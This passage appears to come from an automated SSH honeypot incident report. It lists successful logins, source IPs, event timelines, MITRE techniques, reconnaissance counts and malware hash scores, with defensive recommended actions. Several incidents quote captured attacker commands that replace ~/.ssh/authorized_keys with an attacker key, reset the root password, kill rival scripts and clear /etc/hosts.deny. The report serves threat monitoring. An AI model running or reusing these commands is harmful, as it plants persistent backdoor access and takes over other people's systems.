| `2026-06-13 08:56:23` | `cowrie.command.failed` |
| `2026-06-13 08:56:23` | `cowrie.log.closed` |
| `2026-06-13 08:56:24` | `cowrie.session.params` |
| `2026-06-13 08:56:24` | `cowrie.command.input` |
| `2026-06-13 08:56:24` | `cowrie.session.file_download` |
| `2026-06-13 08:56:24` | `cowrie.log.closed` |
| `2026-06-13 08:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af7986f15fe

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:56 |
| **Last Seen** | 2026-06-13 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:56:25` | `cowrie.session.connect` |
| `2026-06-13 08:56:25` | `cowrie.client.version` |
| `2026-06-13 08:56:25` | `cowrie.client.kex` |
| `2026-06-13 08:56:25` | `cowrie.login.success` |
| `2026-06-13 08:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1810d1256143

| Field | Detail |
|---|---|
| **Source IP** | `122.162.146[.]24` |
| **First Seen** | 2026-06-13 08:57 |
| **Last Seen** | 2026-06-13 08:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:b53z109OXalu"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:57:46` | `cowrie.session.connect` |
| `2026-06-13 08:57:46` | `cowrie.client.version` |
| `2026-06-13 08:57:46` | `cowrie.client.kex` |
| `2026-06-13 08:57:46` | `cowrie.login.success` |
| `2026-06-13 08:57:46` | `cowrie.session.params` |
| `2026-06-13 08:57:46` | `cowrie.command.input` |
| `2026-06-13 08:57:46` | `cowrie.command.failed` |
| `2026-06-13 08:57:46` | `cowrie.log.closed` |
| `2026-06-13 08:57:47` | `cowrie.session.params` |
| `2026-06-13 08:57:47` | `cowrie.command.input` |
| `2026-06-13 08:57:47` | `cowrie.session.file_download` |
| `2026-06-13 08:57:47` | `cowrie.log.closed` |
| `2026-06-13 08:57:56` | `cowrie.session.params` |
| `2026-06-13 08:57:56` | `cowrie.command.input` |
| `2026-06-13 08:57:56` | `cowrie.log.closed` |
| `2026-06-13 08:57:56` | `cowrie.session.params` |
| `2026-06-13 08:57:56` | `cowrie.command.input` |
| `2026-06-13 08:57:56` | `cowrie.log.closed` |
| `2026-06-13 08:57:56` | `cowrie.session.params` |
| `2026-06-13 08:57:56` | `cowrie.command.input` |
| `2026-06-13 08:57:56` | `cowrie.session.file_download` |
| `2026-06-13 08:57:56` | `cowrie.log.closed` |
| `2026-06-13 08:57:56` | `cowrie.session.params` |
| `2026-06-13 08:57:56` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:57` | `cowrie.session.params` |
| `2026-06-13 08:57:57` | `cowrie.command.input` |
| `2026-06-13 08:57:57` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.params` |
| `2026-06-13 08:57:58` | `cowrie.command.input` |
| `2026-06-13 08:57:58` | `cowrie.log.closed` |
| `2026-06-13 08:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.162.146[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.162.146[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9d9aabf2dc

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:59 |
| **Last Seen** | 2026-06-13 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:59:01` | `cowrie.session.connect` |
| `2026-06-13 08:59:01` | `cowrie.client.version` |
| `2026-06-13 08:59:01` | `cowrie.client.kex` |
| `2026-06-13 08:59:01` | `cowrie.login.success` |
| `2026-06-13 08:59:01` | `cowrie.session.params` |
| `2026-06-13 08:59:01` | `cowrie.command.input` |
| `2026-06-13 08:59:01` | `cowrie.command.failed` |
| `2026-06-13 08:59:01` | `cowrie.log.closed` |
| `2026-06-13 08:59:01` | `cowrie.session.params` |
| `2026-06-13 08:59:01` | `cowrie.command.input` |
| `2026-06-13 08:59:01` | `cowrie.session.file_download` |
| `2026-06-13 08:59:01` | `cowrie.log.closed` |
| `2026-06-13 08:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ac35e350adc

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:59 |
| **Last Seen** | 2026-06-13 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:59:03` | `cowrie.session.connect` |
| `2026-06-13 08:59:03` | `cowrie.client.version` |
| `2026-06-13 08:59:03` | `cowrie.client.kex` |
| `2026-06-13 08:59:03` | `cowrie.login.success` |
| `2026-06-13 08:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96e3f521f51

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 09:00 |
| **Last Seen** | 2026-06-13 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 09:00:59` | `cowrie.session.connect` |
| `2026-06-13 09:00:59` | `cowrie.client.version` |
| `2026-06-13 09:00:59` | `cowrie.client.kex` |
| `2026-06-13 09:00:59` | `cowrie.login.success` |
| `2026-06-13 09:00:59` | `cowrie.session.params` |
| `2026-06-13 09:00:59` | `cowrie.command.input` |
| `2026-06-13 09:00:59` | `cowrie.command.failed` |
| `2026-06-13 09:00:59` | `cowrie.log.closed` |
| `2026-06-13 09:00:59` | `cowrie.session.params` |
| `2026-06-13 09:00:59` | `cowrie.command.input` |
| `2026-06-13 09:00:59` | `cowrie.session.file_download` |
| `2026-06-13 09:00:59` | `cowrie.log.closed` |
| `2026-06-13 09:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6c10ab9560

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 09:01 |
| **Last Seen** | 2026-06-13 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 09:01:01` | `cowrie.session.connect` |
| `2026-06-13 09:01:01` | `cowrie.client.version` |
| `2026-06-13 09:01:01` | `cowrie.client.kex` |
| `2026-06-13 09:01:01` | `cowrie.login.success` |
| `2026-06-13 09:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f1bdeb2ddd

| Field | Detail |
|---|---|
| **Source IP** | `122.162.146[.]24` |
| **First Seen** | 2026-06-13 09:07 |
| **Last Seen** | 2026-06-13 09:08 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IllH6rznzrlM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 09:07:47` | `cowrie.session.connect` |
| `2026-06-13 09:07:47` | `cowrie.client.version` |
| `2026-06-13 09:07:47` | `cowrie.client.kex` |
| `2026-06-13 09:07:47` | `cowrie.login.success` |
| `2026-06-13 09:07:47` | `cowrie.session.params` |
| `2026-06-13 09:07:47` | `cowrie.command.input` |
| `2026-06-13 09:07:47` | `cowrie.command.failed` |
| `2026-06-13 09:07:48` | `cowrie.log.closed` |
| `2026-06-13 09:07:48` | `cowrie.session.params` |
| `2026-06-13 09:07:48` | `cowrie.command.input` |
| `2026-06-13 09:07:48` | `cowrie.session.file_download` |
| `2026-06-13 09:07:48` | `cowrie.log.closed` |
| `2026-06-13 09:08:04` | `cowrie.session.params` |
| `2026-06-13 09:08:04` | `cowrie.command.input` |
| `2026-06-13 09:08:04` | `cowrie.log.closed` |
| `2026-06-13 09:08:04` | `cowrie.session.params` |
| `2026-06-13 09:08:04` | `cowrie.command.input` |
| `2026-06-13 09:08:04` | `cowrie.log.closed` |
| `2026-06-13 09:08:04` | `cowrie.session.params` |
| `2026-06-13 09:08:04` | `cowrie.command.input` |
| `2026-06-13 09:08:04` | `cowrie.session.file_download` |
| `2026-06-13 09:08:04` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:05` | `cowrie.session.params` |
| `2026-06-13 09:08:05` | `cowrie.command.input` |
| `2026-06-13 09:08:05` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.params` |
| `2026-06-13 09:08:06` | `cowrie.command.input` |
| `2026-06-13 09:08:06` | `cowrie.log.closed` |
| `2026-06-13 09:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.162.146[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.162.146[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `64.207.185[.]5` | **37** | 2026-06-13 04:10 | 2026-06-13 07:01 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `118.145.242[.]91` | **32** | 2026-06-13 04:24 | 2026-06-13 05:17 | 44m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.50.51[.]198` | **30** | 2026-06-13 04:24 | 2026-06-13 05:07 | 53m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.26.39[.]178` | **30** | 2026-06-13 05:04 | 2026-06-13 06:08 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `129.226.213[.]238` | **30** | 2026-06-13 04:29 | 2026-06-13 05:30 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.251.233[.]37` | **30** | 2026-06-13 05:41 | 2026-06-13 06:43 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.214.209[.]153` | **30** | 2026-06-13 07:00 | 2026-06-13 08:00 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.130[.]156` | **30** | 2026-06-13 08:01 | 2026-06-13 09:02 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `212.64.19[.]167` | **30** | 2026-06-13 05:43 | 2026-06-13 07:02 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `50.6.228[.]111` | **30** | 2026-06-13 07:13 | 2026-06-13 08:04 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.8[.]188` | **20** | 2026-06-13 05:53 | 2026-06-13 06:49 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `68.233.116[.]124` | **15** | 2026-06-13 08:24 | 2026-06-13 08:58 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.107[.]234` | **10** | 2026-06-13 07:36 | 2026-06-13 08:15 | 16m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.252[.]94` | **8** | 2026-06-13 07:41 | 2026-06-13 07:43 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `103.59.163[.]132` | **4** | 2026-06-13 04:06 | 2026-06-13 04:12 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.149[.]64` | **3** | 2026-06-13 08:28 | 2026-06-13 08:30 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `13.86.113[.]74` | **2** | 2026-06-13 07:24 | 2026-06-13 07:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | **2** | 2026-06-13 05:04 | 2026-06-13 06:05 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `154.83.13[.]181` | **2** | 2026-06-13 06:56 | 2026-06-13 08:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.15[.]119` | **2** | 2026-06-13 04:42 | 2026-06-13 04:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.155.66[.]2` | **2** | 2026-06-13 06:50 | 2026-06-13 08:10 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]131` | **2** | 2026-06-13 08:18 | 2026-06-13 08:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.95[.]172` | 1 | 2026-06-13 07:12 | 2026-06-13 07:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.47.158[.]56` | 1 | 2026-06-13 08:04 | 2026-06-13 08:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.221.30[.]186` | 1 | 2026-06-13 07:58 | 2026-06-13 07:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.13.206[.]152` | 1 | 2026-06-13 05:00 | 2026-06-13 05:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-06-13 06:13 | 2026-06-13 06:13 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.104.160[.]194` | 1 | 2026-06-13 07:27 | 2026-06-13 07:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `109.57.21[.]27` | 1 | 2026-06-13 09:02 | 2026-06-13 09:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-06-13 06:52 | 2026-06-13 06:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.226.237[.]113` | 1 | 2026-06-13 06:49 | 2026-06-13 06:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `117.50.185[.]190` | 1 | 2026-06-13 05:48 | 2026-06-13 05:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.199.25[.]179` | 1 | 2026-06-13 04:37 | 2026-06-13 04:38 | 42s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]135` | 1 | 2026-06-13 07:55 | 2026-06-13 07:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.91[.]55` | 1 | 2026-06-13 08:04 | 2026-06-13 08:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.107.38[.]251` | 1 | 2026-06-13 08:18 | 2026-06-13 08:19 | 25s | 0 | `T1592` | 🟢 LOW |
| `160.187.240[.]90` | 1 | 2026-06-13 08:17 | 2026-06-13 08:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `160.22.18[.]220` | 1 | 2026-06-13 07:13 | 2026-06-13 07:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.84.92[.]181` | 1 | 2026-06-13 05:45 | 2026-06-13 05:45 | 31s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]212` | 1 | 2026-06-13 09:05 | 2026-06-13 09:05 | 1s | 0 | `T1592` | 🟢 LOW |
| `186.68.83[.]104` | 1 | 2026-06-13 05:08 | 2026-06-13 05:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.188.231[.]115` | 1 | 2026-06-13 05:07 | 2026-06-13 05:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `197.248.159[.]62` | 1 | 2026-06-13 06:51 | 2026-06-13 06:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.192.232[.]180` | 1 | 2026-06-13 04:35 | 2026-06-13 04:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.202.143[.]68` | 1 | 2026-06-13 05:42 | 2026-06-13 05:43 | 60s | 0 | `T1592` | 🟢 LOW |
| `41.204.82[.]238` | 1 | 2026-06-13 04:59 | 2026-06-13 04:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.128.70[.]79` | 1 | 2026-06-13 08:24 | 2026-06-13 08:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.64.242[.]249` | 1 | 2026-06-13 07:04 | 2026-06-13 07:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.250.151[.]203` | 1 | 2026-06-13 08:35 | 2026-06-13 08:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.222.210[.]184` | 1 | 2026-06-13 07:27 | 2026-06-13 07:28 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
